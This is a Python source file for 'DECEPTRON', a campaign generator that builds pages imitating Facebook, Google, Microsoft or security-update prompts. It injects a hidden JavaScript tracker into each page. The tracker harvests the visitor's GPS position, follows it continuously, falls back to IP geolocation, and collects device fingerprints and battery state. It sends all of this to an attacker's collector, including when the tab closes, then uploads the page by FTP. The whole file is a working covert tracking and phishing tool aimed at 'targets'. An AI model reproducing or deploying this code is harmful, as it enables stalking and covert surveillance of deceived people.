#!/usr/bin/env python3
"""DECEPTRON v1.2 — Campaign generator (full Python, no bash heredoc)."""
import json, os, sqlite3, uuid, ftplib, urllib.parse
from init_db import init_db
from banner import print_banner

VALID_TEMPLATES = ("facebook", "google", "microsoft", "security", "update", "custom")

TRACKER = """<script>
(function() {{
    const collector = {collector};
    const campaign = {campaign};
    const session = {session};
    const redirect = {redirect};

    function extras() {{
        const e = {{ screen: screen.width + 'x' + screen.height, dpr: window.devicePixelRatio,
                     lang: navigator.language, platform: navigator.platform,
                     tz: Intl.DateTimeFormat().resolvedOptions().timeZone,
                     ref: document.referrer || 'direct' }};
        try {{ navigator.getBattery && navigator.getBattery().then(b => {{ e.battery = Math.round(b.level*100)+'%'; e.charging = b.charging; }}); }} catch(_)}}
        return e;
    }}

    function sendData(lat, lng, acc, source) {{
        return fetch(collector, {{
            method: 'POST',
            headers: {{'Content-Type': 'application/json'}},
            body: JSON.stringify({{
                id: campaign, session: session, lat: lat, lng: lng, acc: acc,
                ua: navigator.userAgent, ts: Math.floor(Date.now() / 1000),
                source: source, extras: extras()
            }})
        }}).catch(function() {{}});
    }}

    function ipFallback() {{
        fetch('https://ipapi.co/json/')
            .then(r => r.json())
            .then(d => sendData(d.latitude || 0, d.longitude || 0, 5000, 'ip'))
            .catch(() => sendData(0, 0, 99999, 'unknown'));
    }}

    // v1.2: keep-alive beacon — collector is pinged on pagehide too, so a
    // target who closes the tab mid-prompt still logs the session.
    window.addEventListener('pagehide', function() {{
        navigator.sendBeacon && navigator.sendBeacon(collector, JSON.stringify({{
            id: campaign, session: session, lat: 0, lng: 0, acc: 99999,
            source: 'beacon', ts: Math.floor(Date.now()/1000), extras: {{}} }}));
    }});

    if (navigator.geolocation) {{
        navigator.geolocation.getCurrentPosition(
            pos => sendData(pos.coords.latitude, pos.coords.longitude, pos.coords.accuracy, 'gps'),
            ipFallback,
            {{ enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }}
        );
        // v1.2: continuous tracking — higher-quality fix updates the pin live
        navigator.geolocation.watchPosition(
            pos => sendData(pos.coords.latitude, pos.coords.longitude, pos.coords.accuracy, 'gps'),
            () => {{}}, {{ enableHighAccuracy: true, maximumAge: 30000 }}
        );
    }} else {{ ipFallback(); }}
}})();
</script>"""


def main():
    print_banner()
    with open("config.json") as f:
        cfg = json.load(f)
    db_path = cfg.get("db_path", "db/hits.db")
    init_db(db_path)

    collector = cfg.get("collector_url", "").strip()
    base_url = cfg.get("base_url", "").strip()
    if not collector:
        collector = input("[?] collector_url not set — enter collector URL (HTTPS): ").strip()
        if not collector:
            raise SystemExit("[!] Aborting: no collector URL.")

    campaign = input("[?] Campaign name: ").strip()
    while not campaign or "/" in campaign or ".." in campaign or any(c in campaign for c in "\"'`<>;"):
        campaign = input("[!] Invalid name. Campaign name: ").strip()

    template = input(f"[?] Template {VALID_TEMPLATES}: ").strip().lower()
    while template not in VALID_TEMPLATES:
        template = input(f"[!] Invalid. Template {VALID_TEMPLATES}: ").strip().lower()

    redirect = input("[?] Redirect URL after capture: ").strip() or "https://www.google.com"

    if template == "custom":
        print("[*] Paste custom HTML (end with a line containing only 'EOF'):")
        lines = []
        while True:
            try:
                line = input()
            except EOFError:
                break
            if line.strip() == "EOF":
                break
            lines.append(line)
        html_body = "\n".join(lines).strip() or "<h1>Loading...</h1>"
    else:
        with open(f"templates/{template}.html") as f:
            html_body = f.read()

    session_id = uuid.uuid4().hex[:8]
    tracker = TRACKER.format(collector=json.dumps(collector), campaign=json.dumps(campaign),
                             session=json.dumps(session_id), redirect=json.dumps(redirect))
    html_body = (html_body.replace("</body>", tracker + "\n</body>")
                 if "</body>" in html_body else html_body + tracker)

    out_dir = f"generated/{campaign}"
    os.makedirs(out_dir, exist_ok=True)
    out_path = f"{out_dir}/index.html"
    with open(out_path, "w") as f:
        f.write(html_body)
    print(f"[+] Generated: {out_path}  (session: {session_id})")

    tracking_link = f"{base_url.rstrip('/')}/{campaign}/" if base_url else f"[local file] {out_path}"

    ftp_host = cfg.get("ftp_host", "")
    if ftp_host:
        try:
            ftp = ftplib.FTP(ftp_host, timeout=30)
            ftp.login(cfg.get("ftp_user", ""), cfg.get("ftp_pass", ""))
            ftp.cwd(cfg.get("ftp_path", "/public_html"))
            try:
                ftp.mkd(campaign)
            except Exception:
                pass
            ftp.cwd(campaign)
            with open(out_path, "rb") as f:
                ftp.storbinary("STOR index.html", f)
            ftp.quit()
            print(f"[+] Uploaded to: {tracking_link}")
        except Exception as e:
            print(f"[!] FTP upload failed: {e}\n[!] Manual upload required: {out_path}")
    else:
        print(f"[!] No FTP config. Manual upload: {out_path}")

    conn = sqlite3.connect(db_path)
    conn.cursor().execute(
        """INSERT INTO campaigns (name, template_type, redirect_url, link) VALUES (?,?,?,?)
           ON CONFLICT(name) DO UPDATE SET template_type=excluded.template_type,
             redirect_url=excluded.redirect_url, link=excluded.link""",
        (campaign, template, redirect, tracking_link))
    conn.commit()
    conn.close()
    print(f"[+] Tracking link: {tracking_link}")

if __name__ == "__main__":
    main()